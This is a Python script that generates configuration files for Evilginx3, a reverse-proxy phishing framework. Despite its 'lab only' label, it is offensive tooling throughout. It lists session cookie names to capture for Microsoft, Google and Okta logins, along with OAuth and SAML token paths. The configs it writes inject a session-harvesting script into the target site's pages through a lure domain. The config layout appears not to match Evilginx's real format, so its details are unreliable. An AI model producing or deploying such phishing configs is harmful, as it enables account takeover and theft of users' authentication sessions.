#!/usr/bin/env python3
"""
evilginx_config.py — Evilginx3 phishlet config generator (EDUCATIONAL / LAB ONLY).

Generates YAML configs for Evilginx3 to demonstrate session hijacking via
reverse-proxy phishing. For authorized security training labs, CTFs, and
red-team engagements with signed Rules of Engagement.

Usage:
    python evilginx_config.py -d login.example.com -p phish.example.com --dry-run
    python evilginx_config.py -d login.example.com -p phish.example.com -o config.yaml

Safety: This tool only writes a CONFIG FILE. It does not launch Evilginx or
attack any target. All DNS / Evilginx runtime steps require explicit operator action.
"""

import argparse, sys
from pathlib import Path
import yaml

# Cookie capture patterns by target type
COOKIE_MAP = {
    "microsoft": ["ESTSAUTH", "ESTSAUTHPERSISTENT", "x-ms-gateway-suite"],
    "google": ["OSID", "HSID", "SID", "SSID", "APISID", "SAPISID"],
    "okta": ["sid", "JSESSIONID", "idx", "t", "DT"],
    "generic": ["session", "token", "auth", "sid", "jwt", "access_token"],
}

TOKEN_TRIGGERS = ["/oauth/token", "/oauth2/", "/authorize", "/callback",
                  "/login/callback", "/saml/consume", "/sso/callback"]


def generate(target, phish_domain, cookies=None, redirect="/", proxy_hosts=None):
    hosts = proxy_hosts or [f"login.{phish_domain}"]
    cookies = cookies or COOKIE_MAP["generic"]
    return {
        "phishlets": [{
            "name": target.replace(".", "_") + "_phishlet",
            "proxy_hosts": hosts,
            "rules": [{
                "name": "inject_session_capture",
                "trigger": {"url": f"://{target}/", "method": "GET"},
                "action": "inject_script",
                "script": "/static/js/session_harvester.js",
            }],
        }],
        "lures": [{"hostname": hosts[0], "path": "/", "redirect_url": redirect}],
        "sessions": {
            "cookie_list": [{"domain": f".{target}", "keys": cookies}],
            "capture_tokens": True,
            "token_triggers": TOKEN_TRIGGERS,
            "phish_domain": phish_domain,
        },
        "advanced": {"log_level": "info", "bind_port": 443, "debug": False},
    }


def main(argv=None):
    p = argparse.ArgumentParser(description="Evilginx3 config generator (lab only)")
    p.add_argument("-d", "--domain", required=True, help="Target domain")
    p.add_argument("-p", "--phish-domain", required=True, help="Phish domain")
    p.add_argument("--redirect", default="/", help="Post-auth redirect")
    p.add_argument("--cookies", nargs="*", help="Cookie names to capture")
    p.add_argument("--proxy-hosts", nargs="*", help="Proxy hostnames")
    p.add_argument("-o", "--output", default="evilginx_phishlet.yaml")
    p.add_argument("--dry-run", action="store_true")
    a = p.parse_args(argv)

    cfg = generate(a.domain, a.phish_domain, a.cookies, a.redirect, a.proxy_hosts)

    if a.dry_run:
        print(yaml.dump(cfg, default_flow_style=False, sort_keys=False))
        return 0

    out = Path(a.output)
    out.write_text(yaml.dump(cfg, default_flow_style=False, sort_keys=False))
    print(f"[+] Config written: {out}")
    print(f"    Target: {a.domain}  |  Phish: {a.phish_domain}")
    print(f"    Cookies: {cfg['sessions']['cookie_list'][0]['keys']}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
